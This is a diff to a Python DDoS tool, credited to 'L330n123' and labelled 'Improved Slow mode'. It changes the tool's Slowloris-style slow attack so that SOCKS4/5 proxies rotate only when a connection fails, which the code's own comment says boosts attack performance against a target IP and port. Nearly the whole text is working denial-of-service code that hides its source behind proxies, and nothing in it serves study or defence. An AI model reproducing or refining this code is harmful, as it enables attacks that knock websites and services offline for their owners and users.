@@ -23,7 +23,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.7.1 (Fixed Error)
+Python3 version 2.8 (Improved Slow mode)
                             C0d3d by L330n123
 ╔═════════════════════════════════════════════╗
 ║        Tos: Don't attack .gov website       ║
@@ -265,14 +265,13 @@ def post(socks_type):
 
 socket_list=[]
 def slow(conn,socks_type):
+	proxy = random.choice(proxies).strip().split(":")
+	if socks_type == 4:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	for _ in range(conn):
-		proxy = random.choice(proxies).strip().split(":")
-		if socks_type == 4:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-		if socks_type == 5:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			s = socks.socksocket()
 			s.settimeout(0.6)
 			s.connect((str(ip), int(port)))
@@ -287,6 +286,11 @@ def slow(conn,socks_type):
 			sys.stdout.flush()
 		except:
 			s.close()
+			proxy = random.choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
+			if socks_type == 4:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			if socks_type == 5:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	while True:
@@ -300,12 +304,12 @@ def slow(conn,socks_type):
 				socket_list.remove(s)
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
+		proxy = random.choice(proxies).strip().split(":")
+		if socks_type == 4:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+		if socks_type == 5:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 		for _ in range(conn - len(socket_list)):
-			proxy = random.choice(proxies).strip().split(":")
-			if socks_type == 4:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-			if socks_type == 5:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			try:
 				s.settimeout(1)
 				s.connect((str(ip), int(port)))
@@ -319,6 +323,11 @@ def slow(conn,socks_type):
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
+				proxy = random.choice(proxies).strip().split(":")
+				if socks_type == 4:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if socks_type == 5:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 				pass
